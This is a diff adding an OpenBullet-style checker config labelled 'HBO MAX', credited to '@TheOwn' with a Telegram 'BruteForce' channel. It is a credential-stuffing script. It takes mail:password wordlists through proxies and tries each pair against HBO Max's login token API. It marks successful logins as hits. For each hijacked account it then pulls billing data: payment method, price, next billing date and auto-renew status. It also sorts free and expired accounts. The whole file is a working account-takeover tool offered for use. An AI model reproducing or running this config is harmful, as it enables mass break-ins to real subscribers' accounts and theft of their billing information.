@@ -1,0 +1,157 @@
+[SETTINGS]
+{
+  "Name": "HBO MAX",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-08-24T16:17:06.1599584+04:30",
+  "AdditionalInfo": "Telegram Channel: T.me/BruteForce | Needs US Proxy | Capture | Move Free Accounts To Custom | CPM Rate: 100_1000",
+  "RequiredPlugins": [],
+  "Author": "@TheOwn",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#GEN FUNCTION RandomString "?h?h?h?h?h?h?h?h-?h?h?h?h-4?h?h?h-8?h?h?h-?h?h?h?h?h?h?h?h?h?h?h?h" -> VAR "guid" 
+
+#Post1 REQUEST POST "https://comet.api.hbo.com/tokens" 
+  CONTENT "{\"client_id\":\"585b02c8-dbe1-432f-b1bb-11cf670fbeb0\",\"client_secret\":\"585b02c8-dbe1-432f-b1bb-11cf670fbeb0\",\"scope\":\"browse video_playback_free\",\"grant_type\":\"client_credentials\",\"deviceSerialNumber\":\"21c8000c-a6ec-4cd2-cbfe-2244937df5fb\",\"clientDeviceData\":{\"paymentProviderCode\":\"blackmarket\"}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "X-B3-TraceId: <guid>-<guid>" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36" 
+  HEADER "X-Hbo-Device-Name: desktop" 
+  HEADER "Accept: application/vnd.hbo.v9.full+json" 
+  HEADER "X-Hbo-Device-Os-Version: undefined" 
+  HEADER "X-Hbo-Client-Version: Hadron/50.0.0.36 desktop (DESKTOP)" 
+  HEADER "Origin: https://play.hbomax.com" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://play.hbomax.com/page/urn:hbo:page:home" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "<SOURCE>" DoesNotContain "access_token" 
+    KEY "geo_blocked" 
+
+#Token PARSE "<SOURCE>" JSON "access_token" -> VAR "Token" 
+
+#Post2 REQUEST POST "https://comet.api.hbo.com/tokens" 
+  CONTENT "{\"grant_type\":\"user_name_password\",\"scope\":\"browse video_playback device elevated_account_management\",\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: comet.api.hbo.com" 
+  HEADER "Connection: close" 
+  HEADER "Content-Length: 169" 
+  HEADER "X-B3-TraceId: <guid>-<guid>" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Authorization: Bearer <Token>" 
+  HEADER "X-Hbo-Device-Name: desktop" 
+  HEADER "Accept: application/vnd.hbo.v9.full+json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36" 
+  HEADER "X-Hbo-Device-Os-Version: undefined" 
+  HEADER "X-Hbo-Client-Version: Hadron/50.3.0.362 desktop (DESKTOP)" 
+  HEADER "Origin: https://play.hbomax.com" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://play.hbomax.com/" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "The email address or password is incorrect. Please try again." 
+    KEY "{\"statusCode\":500}" 
+  KEYCHAIN Success OR 
+    KEY "isUserLoggedIn\":true" 
+
+#CapT PARSE "<SOURCE>" JSON "access_token" -> VAR "CapT" 
+
+#Cap REQUEST POST "https://comet.api.hbo.com/content" 
+  CONTENT "[{\"id\":\"urn:hbo:continue-watching:mine\"}]" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: comet.api.hbo.com" 
+  HEADER "Connection: close" 
+  HEADER "Content-Length: 41" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Authorization: Bearer <CapT>" 
+  HEADER "X-Hbo-Device-Name: desktop" 
+  HEADER "Accept: application/vnd.hbo.v9.full+json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36" 
+  HEADER "X-Hbo-Device-Os-Version: undefined" 
+  HEADER "X-Hbo-Client-Version: Hadron/50.3.0.362 desktop (DESKTOP)" 
+  HEADER "Origin: https://play.hbomax.com" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://play.hbomax.com/" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#Tag PARSE "<SOURCE>" LR "{\"ETag\":\"" "\"," -> VAR "Tag" 
+
+#Cap REQUEST POST "https://comet.api.hbo.com/content" 
+  CONTENT "[{\"id\":\"urn:hbo:billing-status:mine\",\"headers\":{\"If-None-Match\":\"<Tag>\"}}]" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/vnd.hbo.v9.full+json" 
+  HEADER "Host: comet.api.hbo.com" 
+  HEADER "Connection: close" 
+  HEADER "Content-Length: 41" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Authorization: Bearer <CapT>" 
+  HEADER "X-Hbo-Device-Name: desktop" 
+  HEADER "X-Hbo-Device-Os-Version: undefined" 
+  HEADER "X-Hbo-Client-Version: Hadron/50.3.0.362 desktop (DESKTOP)" 
+  HEADER "Origin: https://play.hbomax.com" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://play.hbomax.com/" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#Billed_Through PARSE "<SOURCE>" LR "\"Billed Through: [" "](strong)\\n\\nPrice:" CreateEmpty=FALSE -> CAP "Billed Through" 
+
+#Price PARSE "<SOURCE>" LR "Price: [" "](strong)\\n\\nPayment Method" CreateEmpty=FALSE -> CAP "Price" 
+
+#Payment_Method PARSE "<SOURCE>" LR "Payment Method: [" "]" CreateEmpty=FALSE -> CAP "Payment Method" 
+
+#nNext_Billing_Date PARSE "<SOURCE>" LR "Next Billing Date: [" "]" CreateEmpty=FALSE -> CAP "Next Billing Date" 
+
+#autoRenewToggleable PARSE "<SOURCE>" JSON "autoRenewToggleable" CreateEmpty=FALSE -> CAP "autoRenewToggleable" 
+
+#autoRenew PARSE "<SOURCE>" JSON "autoRenew" CreateEmpty=FALSE -> CAP "autoRenew" 
+
+#paymentMethodEditable PARSE "<SOURCE>" JSON "paymentMethodEditable" CreateEmpty=FALSE -> CAP "paymentMethodEditable" 
+
+#billingInformationMessage PARSE "<SOURCE>" JSON "billingInformationMessage" -> VAR "billingInformationMessage" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<billingInformationMessage>" Contains "You’re not subscribed to HBO Max." 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "<billingInformationMessage>" Contains "expired on" 
+
